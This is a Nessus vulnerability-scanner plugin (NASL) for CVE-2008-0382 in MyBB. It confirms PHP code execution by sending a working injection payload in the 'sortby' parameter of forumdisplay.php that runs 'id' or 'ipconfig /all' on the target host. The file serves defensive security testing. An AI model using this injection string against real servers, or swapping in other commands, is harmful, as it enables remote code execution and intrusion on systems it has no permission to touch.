#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29996);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/05/16 14:12:51 $");

  script_cve_id("CVE-2008-0382");
  script_bugtraq_id(27322);
  script_osvdb_id(42800);

  script_name(english:"MyBB forumdisplay.php 'sortby' Parameter Arbitrary PHP Code Execution");
  script_summary(english:"Tries to run a command via MyBB");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that allows arbitrary command
execution.");
  script_set_attribute(attribute:"description", value:
"The version of MyBB installed on the remote host is affected by an 
arbitrary PHP code execution vulnerability due to improper
sanitization of user-supplied input to the 'sortby' parameter of the 
forumdisplay.php script before using it in an eval() statement to
evaluate PHP code. A remote, unauthenticated attacker can exploit this
issue to execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id. 

There is also a similar issue affecting the search.php script when the
'action' parameter is set to 'results'. However, Nessus did not test
for this issue.");
  script_set_attribute(attribute:"see_also", value:"http://www.waraxe.us/advisory-61.html");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/486434/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://community.mybboard.net/showthread.php?tid=27227");
  script_set_attribute(attribute:"solution", value:"Upgrade to MyBB 1.2.11 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/01/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/01/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/01/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mybb:mybb");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("mybb_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "installed_sw/MyBB");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "MyBB";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# We need a valid forum id.
res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/index.php",
  exit_on_fail : TRUE
);

fid = NULL;
pat = 'forumdisplay\\.php\\?fid=([0-9]+)';
matches = egrep(pattern:pat, string:res);
if (matches)
{
  foreach match (split(matches))
  {
    match = chomp(match);
    item = eregmatch(pattern:pat, string:match);
    if (!empty_or_null(item))
    {
      fid = item[1];
      break;
    }
  }
}
if (empty_or_null(fid))
  exit(0, "Nessus was unable to find a forum id to use on the " + app+ " install at " + install_url);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask|IP(v(4|6)?)? Address";
vuln = FALSE;

foreach cmd (cmds)
{
  exploit = "/forumdisplay.php?fid=" +fid+ "&sortby='];system('" +cmd+ "');exit;//";
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + exploit,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}
if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  request     : make_list(install_url + exploit),
  output      : chomp(res[2])
);
exit(0);
